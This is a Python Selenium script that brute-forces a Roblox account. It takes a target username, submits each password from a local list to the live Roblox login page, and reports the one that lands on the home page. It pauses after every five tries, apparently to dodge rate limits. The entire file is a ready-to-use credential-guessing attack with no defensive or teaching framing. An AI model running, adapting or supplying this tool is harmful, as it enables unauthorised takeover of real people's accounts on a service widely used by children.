from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import sys

print("STARTING...")
print("PLEASE MAKE SURE WHEN LOADED PROVIDE USERNAME!")
print("AND A GOOD WI-FI!")
print("PLEASE IGNORE THESE ERROR MESSAGES; IT'S OK!")

def main():
    print("Executing Firefox...")
    time.sleep(1)

    # Set up Headless Firefox
    firefox_options = Options()
    #firefox_options.add_argument("--headless")
    driver = webdriver.Firefox(options=firefox_options)

    print("Going to login...")
    time.sleep(1)

    print("YOU CAN PROVIDE USERNAME NOW")
    username = input("Username: ")

    print("Getting password_list...")
    time.sleep(1)
    # Read the passwords from the password_list.txt file
    with open("password_list.txt", "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    print("Starting to try each password...")
    login_attempts = 0

    for password in passwords:
        # Reload the login page for every attempt
        driver.get("https://www.roblox.com/login")

        try:
            print("Locating username and password textboxes...")
            username_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, 'username'))
            )
            password_input = driver.find_element(By.NAME, 'password')
            login_button = driver.find_element(By.ID, 'login-button')

            print("Sending username and password...")
            username_input.send_keys(username)
            password_input.send_keys(password)

            print(f"> Trying: {password}")
            login_button.click()

            # Wait for a response and check if login was successful
            time.sleep(5)
            if driver.current_url == "https://www.roblox.com/home":
                print(f">> Yay! You successfully logged in as {username} with password {password}.")
                sys.exit(0)
            else:
                print(f">!> Failed with password: {password}")

        except Exception as e:
            print(f">!> Error during attempt with password: {password}. Error: {e}")

        login_attempts += 1

        # Pause for 30 seconds after every 5 attempts
        if login_attempts % 5 == 0:
            print(">!> Pausing for 30 seconds after 5 attempts...")
            time.sleep(30)

    print("Finished trying all passwords.")
    driver.quit()

if __name__ == "__main__":
    main()
